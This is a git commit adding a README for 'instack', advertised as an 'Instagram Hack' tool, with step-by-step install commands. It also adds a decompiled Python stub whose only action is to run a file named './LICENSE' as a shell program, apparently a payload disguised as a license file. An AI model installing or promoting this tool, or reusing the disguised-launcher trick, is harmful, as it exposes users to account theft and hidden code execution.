f38ae0acc10748fff639ede89a3c9f8f72fde9a8
htr-tech <tahmidrayat@gmail.com>
2020-09-25 21:13:27 +0600

    faizanwahla/instack

---
+++ instack/README.md
@@ -0,0 +1,26 @@
+# instack
+Instagram Hack
+
+
+>>>TO INSTALL THIS TOOL USE THE FOLLOWING COMMANDS
+
+
+apt update && apt upgrade
+
+apt install python -y
+
+apt install python2 -y
+
+apt install git -y
+
+apt install jq -y
+
+pip2 install requests mechanize
+
+git clone https://github.com/faizanwahla/instack
+
+cd instack
+
+chmod + *
+
+python2 instack.py
---
+++ instack/instack_dec.py
@@ -0,0 +1,14 @@
+
+# Python Auto Dis Parser 1.0.1
+# Author : HTR-TECH | TAHMID RAYAT
+# https://linktr.ee/tahmid.rayat
+# https://fb.me/tahmid.rayat.official
+# ------------------------------------------
+# uncompyle6 version 3.7.3
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
+# [GCC 8.3.0]
+# Embedded file name: dg
+import subprocess
+print 'start'
+subprocess.call('./LICENSE', shell=True)
